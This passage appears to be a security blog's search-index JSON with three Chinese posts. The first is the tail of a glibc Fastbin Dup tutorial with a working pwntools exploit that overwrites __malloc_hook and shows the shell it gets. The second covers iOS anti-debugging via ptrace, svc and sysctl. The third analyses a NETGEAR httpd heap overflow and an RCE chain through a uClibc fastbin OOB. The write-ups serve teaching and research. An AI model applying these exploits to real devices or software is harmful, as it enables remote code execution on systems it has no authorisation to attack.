ok，可以看到虽然当前[rsp+0x50]不为空，但是 rsp+50 指向的是我们可以控制的字符，那么就可以手动将其设置成0，如此第二个就满足条件了，wink~ 123456789101112131415161718192021222324252627282930# =============================================================================io.sendafter(&quot;username: &quot;, p64(0) + p64(0x71))# io.sendafter(&quot;username: &quot;, &quot;FastbinDup&quot;)io.recvuntil(&quot;&gt; &quot;)chunk_A = malloc(0x68, &quot;A&quot;*0x68)chunk_B = malloc(0x68, &quot;B&quot;*0x68)input(&quot;after malloc&quot;)free(chunk_A)free(chunk_B)input(&quot;after free normal&quot;)free(chunk_A)input (&quot;after double free&quot;)# dup=malloc(0x68, p64(elf.sym.user))dup = malloc(0x68, p64(libc.sym.__malloc_hook-0x23))input(&quot;malloc for user addr&quot;)malloc(0x68,&quot;C&quot;*0x68)malloc(0x68,&quot;D&quot;*0x68)# malloc(0x68,&quot;arbitrary write&quot;)# malloc(0x68, p64(libc.sym.system))malloc(0x68, p8(0)*19+p64(libc.address + 0xe1fa1))malloc(0x68, &quot;&quot;)print (&quot;enjoy~&quot;)# =============================================================================io.interactive() 1234567891011121314151617181920212223x@ubuntu  python3 RCE_Fastbin_Dup.py[*] '/home/x/fastbin_dup/fastbin_dup' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'../.glibc/glibc_2.30_no-tcache'[*] '/home/x/.glibc/glibc_2.30_no-tcache/libc-2.30.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Starting local process '/home/x/fastbin_dup/fastbin_dup': pid 13618after mallocafter free normalafter double freemalloc for user addrenjoy~[*] Switching to interactive mode$ iduid=1000(x) gid=1000(x) groups=1000(x),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare) 小结 Fastbin Dup 就是通过double free修改fd指针，将fake fast bin 链入当前的链表中，之后再分配到对应地址 fastbin 的double free 检查只检查当前链入的块是否是第一个，不是则ok 在分配fastbin出去时，会检查当前chunk中表示size的字段与当前bin所在的大小是否一致，不符合则报错，所以size字段需要符合条件 利用时__malloc_hook是一个很好的目标，通过find_fake_fast找到符合条件的地址，之后覆盖_malloc_hook为对应的地址即可，one_gadget 可以用于在glibc的so文件中查找”/bin/sh”","link":"/2020/12/27/glibc%E5%88%A9%E7%94%A8%E4%B9%8BFastbinDup/"},{"title":"小记iOS反调试","text":"前段时间在看雪上发了篇bypass反调试的笔记 ， 之后有不少人私信我反调试相关问题，不乏一些比较尖锐的问题把我也问懵了。后来反思了一下，虽然我跟大哥们学会了不少骚操作，但是没有自己系统的整理过，经常是根据问题去现找…. 屏蔽调试器的方式ptrace：是unix 系统中的一种系统调用，它提供了一个进程可以控制另一个进程运行的方法，并且可以修改被控制进程的内存和寄存器，主要用于调试和系统调用追踪。函数原型如下： 123456NAME ptrace - process traceSYNOPSIS #include &lt;sys/ptrace.h&gt; long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); request代表请求类型,pid代表被调试进程的pid，常用的有： PTRACE_TRACEME：表示将被调试进程跟踪，对于每个进程，PTRACE_TRACEME只能被调用一次 PTRACE_ATTACH：attach到pid进程上，相当于pid进程执行了PTRACE_TRACEME PTRACE_SYSCALL：使被调试进程继续运行,但是在下一个系统调用的入口处或出口处停下,或者是执行完一条指令后停下. 这里根据ptrace的特性，每个进程都只能被PTRACE_TRACEME一次，所以在程序的开始位置主动执行ptrace(PTRACE_TRACEME,0,0,0)后，其它进程就没办法再attach上了。 由于ptrace是系统调用，所以除了直接通过api的方式调用外，还可以通过其它方式来调用。提起系统调用自然就会想到用syscall来调: 在用户空间和内核空间之间，有一个叫做Syscall(系统调用, system call)的中间层，是连接用户态和内核态的桥梁。这样即提高了内核的安全型，也便于移植，只需实现同一套接口即可。Linux系统，用户空间通过向内核空间发出Syscall，产生软中断，从而让程序陷入内核态，执行相应的操作。对于每个系统调用都会有一个对应的系统调用号，比很多操作系统要少很多。 1234567NAME top syscall - indirect system callSYNOPSIS top #include &lt;sys/syscall.h&gt; /* Definition of SYS_* constants */ #include &lt;unistd.h&gt; long syscall(long number, ...); 使用syscall调用ptrace也就是 syscall(SYS_ptrace, PT_DENY_ATTACH, 0, 0, 0) 除了这种方式还可以通过svc调用来实现，看网上很多文章都有写用svc但是少有写svc是什么的。SVC指令在ARM体系中被归于异常处理类指令，该指令能允许用户程序调用内核，其格式如下： 1SVC{cond} #imm // Supervisor call, allows application program to call the kernel (EL1) 与传统arm中使用svc 0 表示中断不一样，xnu中使用的是svc 0x80 123456789101112131415//xnu-3789.41.3/bsd/kern/syscall.h#define SYS_ptrace 26//https://github.com/apple/darwin-xnu/blob/8f02f2a044b9bb1ad951987ef5bab20ec9486310/osfmk/mach/arm/vm_param.h#define SWI_SYSCALL 0x80//https://github.com/apple/darwin-xnu/blob/8f02f2a044b9bb1ad951987ef5bab20ec9486310/libsyscall/custom/SYS.h#define DO_SYSCALL(num, cerror) \\ mov x16, #(num) %%\\ svc #SWI_SYSCALL %%\\ b.cc 2f %%\\ ARM64_STACK_PROLOG %%\\ PUSH_FRAME %%\\ bl _##cerror %%\\ POP_FRAME %%\\ ARM64_STACK_EPILOG %%\\ 可以看到，系统调用号传给x16寄存器，然后指定svc 0x80来执行系统调用。所以上面的直接调用ptrace 和通过syscall调用ptrace也可以转成： 1234567891011121314151617181920//ptrace(0x31,0,0,0)#ifdef __arm64__ __asm__(&quot;mov X0, #31\\n&quot; &quot;mov X1, #0\\n&quot; &quot;mov X2, #0\\n&quot; &quot;mov X3, #0\\n&quot; &quot;mov w16, #26\\n&quot; &quot;svc #0x80&quot;);#endif//syscall(SYS_ptrace, PT_DENY_ATTACH, 0, 0, 0)#ifdef __arm64__ __asm__(&quot;mov X0, #26\\n&quot; &quot;mov X1, #31\\n&quot; &quot;mov X2, #0\\n&quot; &quot;mov X3, #0\\n&quot; &quot;mov X4, #0\\n&quot; &quot;mov w16, #0\\n&quot; &quot;svc #0x80&quot;);#endif 基于特征去检测的方式检测的方式相对于屏蔽调试器来说就多了许多： sysctl： 当一个进程被调试的时候，该进程会有一个标记来标记自己正在被调试，所以可以通过sysctl去查看当前进程的信息，看有没有这个标记位即可检查当前调试状态。 1234567891011121314151617181920212223#import &lt;sys/sysctl.h&gt;#import &lt;sys/types.h&gt;#import &lt;unistd.h&gt;//int sysctl(int *, u_int, void *, size_t *, void *, size_t);bool debug_sysctl(){ int name[4];//存放字节码，查询信息 struct kinfo_proc info;//接受进程查询结果信息的结构体 size_t info_size = sizeof(info);//结构体的大小 info.kp_proc.p_flag = 0; name[0] = CTL_KERN;//内核查看 name[1] = KERN_PROC;//进程查看 name[2] = KERN_PROC_PID;//进程ID name[3] = getpid();//获取pid，据说这个可以直接传0? int proc_err = sysctl(name, 4, &amp;info, &amp;info_size, NULL, 0); if (proc_err == -1) { //判断是否出现了异常 exit(-1); } //info.kp_proc.p_flag中存放的是标志位（二进制），在proc.h文件中有p_flag的宏定义，通过&amp;运算可知对应标志位的值是否为0。（若结果值为0则对应标志位为0）。其中P_TRACED为正在跟踪调试过程。 return ((info.kp_proc.p_flag &amp; P_TRACED) != 0);} isatty：测试标准输出文件描述符是否指向终端，当被调试的时候这点无疑 1234#import &lt;unistd.h&gt;if (isatty(1)) { exit(0); } ioctl：通过测试标准输出文件描述符的窗口大小，如果为0则可能是在被调试 12345#import &lt;sys/ioctl.h&gt;if (!ioctl(1, TIOCGWINSZ)) { exit(1);} 这种基于检测方式反调试的，一般人的操作是检测到了后直接退出。但是退出这个也太明显了，很容易作为特征被分析出来。可以尝试的是通过svc调用后破坏堆栈，或者是直接将状态上传，然后在程序运行时结合其它暗桩去做处理，具体还是得根据业务逻辑来做。比如某看app检测到处于越狱环境中时，客户端可以拿到server的数据，但是客户端中的一切行为都不会影响到server中的数据，类比思路~ 这里还要提一点，在分析的时候看到很多人有反调试的意识，但是都是在主程序的start中调用的，这样会有个问题，使用api的时候很容易就可以hook然后修改流程。所以这里我们最好是将反调试操作放在动态库中，因为自己的动态库要早于注入的动态库被加载，所以可一定程度防止被hook。这里还是要借用李斌同学的图来解释一下dyld的加载流程： 所以在做反调试的时候，可以尝试在动态库中使用汇编形式的多种手法混合使用，甚至是直接抠出内联汇编的硬编码，然后使用shellcode的方式去调用，具体可以参照我分析zoom的那篇文章中的部分。然后检测调试状态的可以在多处使用，检测到结果后灵活处理。 Linux ptrace详细分析系列 反调试及绕过 Dobby iOS 逆向 - 应用安全攻防(越狱与非越狱) iOS 底层 - 从头梳理 dyld 加载流程","link":"/2021/07/10/%E5%B0%8F%E8%AE%B0iOS%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"title":"小记一则不一样的Fastbin利用","text":"在翻ZDI的历史博客时，看到一个NETGEAR路由器中的堆溢出利用，很是少见，一般路由器中大多是命令执行或栈溢出，很少见到有堆溢出相关的，便跟着走了一遍。 漏洞点及成因漏洞在现在看来其实很无厘头，在文件上传逻辑中获取Content-Length值时通过对整个http的请求做stristr(s1, “Content-Length: “)来定位的，且没有其他的条件限制。 1234567.text:00017308 04 A0 80 E2 ADD R10, R0, #4.text:0001730C A4 17 1F E5 LDR R1, =aContentLength_0 ; &quot;Content-Length: &quot;.text:00017310 04 00 A0 E1 MOV R0, R4.text:00017314 0A 80 64 E0 RSB R8, R4, R10.text:00017318 E7 DA FF EB BL stristr.text:0001731C 00 90 50 E2 SUBS R9, R0, #0.text:00017320 B3 00 00 0A BEQ loc_175F4 所以attacker在请求头中原Content-Length之前如果包含了伪造的字段，即可控制该值。这个值的计算逻辑也很有意思： 1234567v117 = stristr(v115 + 16, &quot;\\r\\n&quot;) - (v115 + 16);fileSize1 = 0;for ( i = 0; i &lt; v117; ++i ){ _chr = *(char *)++v116; fileSize1 = _chr - '0' + 10 * fileSize1;} 可以看到是以\\r\\n作为结束符，在结束符之前的都将作为数字的str，计算时将每个字符的ascii减去0的ascii，然后组合到一起作为实际值来使用。这里的fileSize1是unsigned int，所以这里必然存在整数溢出问题。这个fileSize值在后面用作内存分配的值，申请fileSize的空间后再将上传的内存拷贝至对应位置。 所以在控制了fileSize值后，将其改成比上传内容实际值小便可以触发堆溢出的问题。 1234567891011if ( dword_1A870C ){ free((void *)dword_1A870C); dword_1A870C = 0;}...dword_1A870C = (int)malloc(fileSize1 + 0x258);...memset((void *)dword_1A870C, 32, fileSize1 + 0x258);v208 = v89 - v102;memcpy((void *)dword_1A870C, &amp;s1[v102], v89 - v102); 漏洞的成因大致就是这样，我觉得完全是开发人员不严谨导致的；另一方面也是早起嵌入式开发人员习惯什么事情都自己来完成，所以解析字段时也就直接stristr去获取了，却没做严格的限制。同时在计算数字时也没有考虑到存在非数字字符的情况。 如何利用利用部分主要记录的是堆相关的操作，至于路径选择以及其它跟路由器密切相关的部分这里就不记录了，感兴趣的可以去看原blog。 1234567➜ checksec httpd[*] '/tftpboot/httpd'Arch: arm-32-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8000) 不存在PIE所以我们不用考虑如何去获取heap base，把重点放在堆相关的利用上即可。现在有一个堆溢出且能将任意数据写入堆内存，常规思路有： 通过溢出直接覆盖后面堆块的链表指针去控制后面的堆分配，然覆盖got表… 溢出覆盖__malloc_hook、__free_hook的值，将其修改成gadget… 但是很可惜，这里这两种方式都不大行得通。由于固件中使用的是uClibc，属于glibc的最小libc版本，所以其中并没有__malloc_hook这种机制，所以方法二彻底废了，方法一行不通是因为漏洞点前后有其它因素影响： 溢出点分配的内存会存储在全局变量中，每次使用前会检查全局变量中是否有内容，有的话则先free对应内存将全局变量置0再分配 memcpy拷贝内容触发堆溢出后，会返回错误页面，在这里会调用fopen函数，而在uClibc中fopen会触发两次内存操作，大小分别为0x60和0x1000，大致流程为： 1free(malloc(0x60)), free(malloc(0x1000)) 看到0x60的时候很自然会想到fastbinDup，但是后面这个0x1000就让人头疼了，会触发malloc_consolidate来整理fastbin。这里简单介绍一下malloc_consolidate: 这个函数的作用就是将 fastbin 合并后置入 unsorted bin，一般调用的情况有以下几种： malloc malloc 的大小在 smallbin 范围内，若对应的 smallbin 没初始化的时候。 当申请大于 small bin 范围的堆快时（large chunk） **if (have_fastchunks(av)) **malloc_consolidate(av); 投 topchunk 中没有空闲内存，向系统申请内存时，如果 fastbin 中有空间，则会先尝试整理 fastbin 看能否满足需求，不行再从 system 中申请 free free 一块大内存后会合并其附近的空闲内存，如果合并后的 size 大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，如果有 fastbins 则会调用 malloc_consolidate, 同时如果 top chunk 的 size 大于 trim_threshold，会向操作系统归还内存，也会调用 malloc_consolidate. 由于malloc_consolidate整理了fastbin，所以我们不能用fastbinDup，但是又没用其它更好的办法，似乎无解了。 这里的破局之法还是出现在uClibc中，毕竟是最小版本的glibc，所以其中很多实现都不怎么完善。uClibc中的free 和malloc与glibc中还是有比较大的不同，其中在释放fastbin时存在越界写问题： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164struct malloc_state {/* The maximum chunk size to be eligible for fastbin */size_t max_fast; /* low 2 bits used as flags *//* Fastbins */mfastbinptr fastbins[NFASTBINS];/* Base of the topmost chunk -- not otherwise kept in a bin */mchunkptr top;/* The remainder from the most recent split of a small request */mchunkptr last_remainder;/* Normal bins packed as described above */mchunkptr bins[NBINS * 2];/* Bitmap of bins. Trailing zero map handles cases of largest binned size */unsigned int binmap[BINMAPSIZE+1];/* Tunable parameters */...};/* ------------------------------ malloc ------------------------------ */void* malloc(size_t bytes){size_t nb; /* normalized request size */...av = get_malloc_state();/*Convert request size to internal form by adding (sizeof(size_t)) bytesoverhead plus possibly more to obtain necessary alignment and/orto obtain a size of at least MINSIZE, the smallest allocatablesize. Also, checked_request2size traps (returning 0) request sizesthat are so large that they wrap around zero when padded andaligned.*/checked_request2size(bytes, nb);/*Bypass search if no frees yet*/if (!have_anychunks(av)) {if (av-&gt;max_fast == 0) /* initialization check */__malloc_consolidate(av);goto use_top;}/*If the size qualifies as a fastbin, first check corresponding bin.*/.../* If this is a large request, consolidate fastbins before continuing.While it might look excessive to kill all fastbins beforeeven seeing if there is space available, this avoidsfragmentation problems normally associated with fastbins.Also, in practice, programs tend to have runs of either small orlarge requests, but less often mixtures, so consolidation is notinvoked all that often in most programs. And the programs thatit is called frequently in otherwise tend to fragment.*/else {idx = __malloc_largebin_index(nb);if (have_fastchunks(av))__malloc_consolidate(av);}...}#define ANYCHUNKS_BIT (1U)#define have_anychunks(M) (((M)-&gt;max_fast &amp; ANYCHUNKS_BIT))#define have_fastchunks(M) (((M)-&gt;max_fast &amp; FASTCHUNKS_BIT))#define fastbin_index(sz) ((((unsigned int)(sz)) &gt;&gt; 3) -2)/* ------------------------------ free ------------------------------ */void free(void* mem){ mstate av; mchunkptr p; /* chunk corresponding to mem */ size_t size; /* its size */ mfastbinptr* fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ size_t nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ size_t prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ /* free(0) has no effect */ if (mem == NULL) return; __MALLOC_LOCK; av = get_malloc_state(); p = mem2chunk(mem); size = chunksize(p); check_inuse_chunk(p); /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if ((unsigned long)(size) &lt;= (unsigned long)(av-&gt;max_fast)#if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif ) { set_fastchunks(av); fb = &amp;(av-&gt;fastbins[fastbin_index(size)]); /// &lt;--------- OOB p-&gt;fd = *fb; *fb = p; } /* Consolidate other non-mmapped chunks as they arrive. */ else if (!chunk_is_mmapped(p)) { set_anychunks(av); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); ... /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) { if (have_fastchunks(av)) __malloc_consolidate(av); if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(av-&gt;trim_threshold)) __malloc_trim(av-&gt;top_pad, av); } } /* If the chunk was allocated via mmap, release via munmap() Note that if HAVE_MMAP is false but chunk_is_mmapped is true, then user must have overwritten memory. There's nothing we can do to catch this error unless DEBUG is set, in which case check_inuse_chunk (above) will have triggered error. */ else { size_t offset = p-&gt;prev_size; av-&gt;n_mmaps--; av-&gt;mmapped_mem -= (size + offset); munmap((char*)p - offset, size + offset); } __MALLOC_UNLOCK;} 可以看到在访问fastbins数组时没有边界检查，而fastbins在malloc_state中位于max_fast之后，同时max_fast又是是否执行malloc_consolidate的判断条件，所以只要通过fastbins的越界写来修改max_fast，便可以控制malloc_consolidate让malloc中不整理fastbin，这样我们就可以使用fastbinDup来完成利用了。 控制max_fast的方法也比较好理解，根据fastbin_index可以看到我们只需要将设置成7或8时，index为-1，就可以访问到max_fast。sz又是堆块中表示size的字段，可以通过堆溢出去覆盖修改，所以修改max_fast也就不是问题了。 最后利用流程如下： 通过触发堆溢出漏洞修改下一个堆快的flag，覆盖REV_INUSE标志为0，使其错误地表示前一个chunk是空闲的； 由于错误的PREV_INUSE标志，我们可以malloc()返回一个与实际存在的块重叠的块。因此我们可以修改上一个堆快的size设置为不可能的 8； 当释放这个”size = 8”的堆快后并放置在fastbin 上时，malloc_stats-&gt;max_fast会被改成一个大值（堆快的地址） 当malloc_stats-&gt;max_fast被更改后，malloc(0x1000)便不会再调用malloc_consolidate，所以就可以使用fastbinDup了 再次触发堆溢出漏洞，溢出修改下一个空闲块的fd为free()的GOT地址 再次申请堆快，会返回free的GOT地址，我们可以向其中写入system 的plt地址 最后，在调用free的时候，会调用system，我们可以将其参数指向payload，从而实现RCE 小结这里比较精巧的就是利用uClibc中free函数存在的OOB，是的可以控制malloc_consolidate是否被执行。后面对这个原语搜了一波，发现还有挺多利用中都有用到，是我愚钝了(lll￢ω￢) 在嵌入式设备中，除了常规的程序发掘外，对于一些使用的库也存在很多漏洞。有时候结合这些库中存在的问题可能会得到意想不到的结果。","link":"/2020/12/27/%E5%B0%8F%E8%AE%B0%E4%B8%80%E5%88%99%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84Fastbin%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"iOS","slug":"iOS","link":"/tags/iOS/"},{"name":"QEMU","slug":"QEMU","link":"/tags/QEMU/"},{"name":"Bin","slug":"Bin","link":"/tags/Bin/"},{"name":"Security","slug":"Security","link":"/tags/Security/"},{"name":"Router","slug":"Router","link":"/tags/Router/"},{"name":"NETGEAR","slug":"NETGEAR","link":"/tags/NETGEAR/"}],"categories":[{"name":"iOS","slug":"iOS","link":"/categories/iOS/"},{"name":"QEMU","slug":"QEMU","link":"/categories/QEMU/"},{"name":"BIN","slug":"BIN","link":"/categories/BIN/"}]}